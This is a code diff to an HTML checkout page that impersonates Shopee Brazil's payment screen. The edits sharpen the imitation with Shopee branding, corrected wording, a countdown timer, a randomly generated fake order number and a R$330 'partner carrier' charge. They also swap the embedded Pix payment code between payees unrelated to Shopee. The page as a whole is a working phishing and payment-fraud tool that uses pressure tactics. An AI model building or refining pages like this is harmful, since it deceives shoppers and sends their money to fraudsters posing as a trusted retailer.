@@ -4,13 +4,13 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Pagamento Seguro</title>
+<title>Pagamento Seguro Shopee</title>
 
 <style>
 
 body{
 font-family: Arial, Helvetica, sans-serif;
-background:#f6f6f6;
+background:#f5f5f5;
 margin:0;
 padding:0;
 }
@@ -26,79 +26,92 @@ font-size:18px;
 
 .logo{
 text-align:center;
-margin:15px 0;
+background:white;
+padding:15px;
+border-bottom:1px solid #eee;
 }
 
 .logo img{
-width:120px;
+width:130px;
 }
 
 .container{
 max-width:420px;
-margin:0 auto 20px auto;
+margin:15px auto;
 background:white;
-border-radius:12px;
+border-radius:10px;
 padding:20px;
-box-shadow:0 0 15px rgba(0,0,0,0.08);
+box-shadow:0 2px 10px rgba(0,0,0,0.08);
 }
 
 .status{
-background:#fff3e0;
-padding:10px;
-border-radius:8px;
-text-align:center;
+background:#fff6f3;
+border-left:4px solid #ee4d2d;
+padding:12px;
+border-radius:6px;
 font-size:14px;
 margin-bottom:15px;
-color:#e65100;
-font-weight:bold;
 }
 
 .timer{
-background:#ffe0b2;
+background:#fff1e6;
 padding:10px;
-border-radius:8px;
+border-radius:6px;
 text-align:center;
 margin-bottom:15px;
 font-weight:bold;
+color:#ee4d2d;
 }
 
 .info{
-background:#f8f8f8;
+background:#fafafa;
 padding:12px;
-border-radius:8px;
+border-radius:6px;
 margin-bottom:10px;
+font-size:14px;
 }
 
 .pix-box{
-border:1px solid #ddd;
-padding:10px;
+border:1px solid #eee;
+padding:15px;
 border-radius:8px;
-margin-top:10px;
+margin-top:15px;
 }
 
-input{
+.pix-title{
+font-weight:bold;
+margin-bottom:10px;
+}
+
+textarea{
 width:100%;
 padding:10px;
+height:120px;
 border-radius:6px;
 border:1px solid #ccc;
-margin-top:8px;
+font-size:12px;
 }
 
 button{
 width:100%;
-padding:12px;
+padding:14px;
 background:#ee4d2d;
 color:white;
 border:none;
 border-radius:8px;
 margin-top:10px;
 font-weight:bold;
+font-size:15px;
 cursor:pointer;
+}
+
+button:hover{
+opacity:0.9;
 }
 
 .qr{
 text-align:center;
-margin-top:15px;
+margin-top:20px;
 }
 
 .qr img{
@@ -108,7 +121,14 @@ width:200px;
 .seguro{
 text-align:center;
 font-size:13px;
-color:#666;
+color:#777;
+margin-top:20px;
+}
+
+.footer{
+text-align:center;
+font-size:12px;
+color:#999;
 margin-top:15px;
 }
 
@@ -119,7 +139,7 @@ margin-top:15px;
 <body>
 
 <div class="topo">
-Pagamento Seguro
+Pagamento Seguro Shopee
 </div>
 
 <div class="logo">
@@ -129,7 +149,7 @@ Pagamento Seguro
 <div class="container">
 
 <div class="status">
-Pedido reservado aguardando pagamento para liberar envio imedito
+Pedido reservado com sucesso. Efetue o pagamento para liberar envio imediato.
 </div>
 
 <div class="timer">
@@ -137,7 +157,7 @@ Tempo restante: <span id="tempo">05:00</span>
 </div>
 
 <div class="info">
-Pedido: <span id="pedido"></span>
+Pedido Nº: <strong id="pedido"></strong>
 </div>
 
 <div class="info">
@@ -145,20 +165,20 @@ Cliente: MARIA DA SILVA PEREIRA
 </div>
 
 <div class="info">
-Produto: Transportadora Pareceira Shopee BR
+Produto: Transportadora Parceira Shopee BR
 </div>
 
 <div class="info">
-Valor: R$330,00
+Valor: <strong>R$330,00</strong>
 </div>
 
 <div class="pix-box">
 
-<strong>Chave Pix</strong>
+<div class="pix-title">
+Chave Pix Copia e Cola
+</div>
 
-<strong>Chave Pix</strong>
-
-<textarea id="pix" readonly onclick="this.select()" style="width:100%;padding:10px;height:140px;border-radius:6px;border:1px solid #ccc;white-space:nowrap;overflow:auto;">00020101021226640014br.gov.bcb.pix2542pix.magenpay.io/cob/6s8NsROVQqyexXhueHzUjw5204000053039865802BR5916GANHA SORTE LTDA6009SAO PAULO62070503***630444D7</textarea>
+<textarea id="pix" readonly onclick="this.select()">00020101021226900014br.gov.bcb.pix2568qrcodes.adopay.com.br/v2/qr/cob/3b06ac9f-e1a4-413f-afe7-07045ecb64805204000053039865802BR5925RLOPES10 COMERCIO DE VARI6009SAO PAULO62070503***6304BF43</textarea>
 
 <button onclick="copiar()">Copiar Chave Pix</button>
 
@@ -173,8 +193,12 @@ Valor: R$330,00
 </div>
 
 <div class="seguro">
-Após a confirmação do pagamento, seu pedido será reativado automaticamente na plataforma, garantindo total suporte, segurança e rastreabilidade Shopee.
-Pagamento seguro via Pix
+Pagamento seguro via Pix  
+Após confirmação o envio será imediato
+</div>
+
+<div class="footer">
+Shopee Brasil • Pagamento Seguro
 </div>
 
 </div>
@@ -193,7 +217,7 @@ alert("Chave Pix copiada com sucesso");
 }
 
 function gerarPedido(){
-let numero = Math.floor(Math.random() * 900000000) + 100000000;
+let numero = "BR" + Math.floor(Math.random() * 9000000000);
 document.getElementById("pedido").innerText = numero;
 }
 
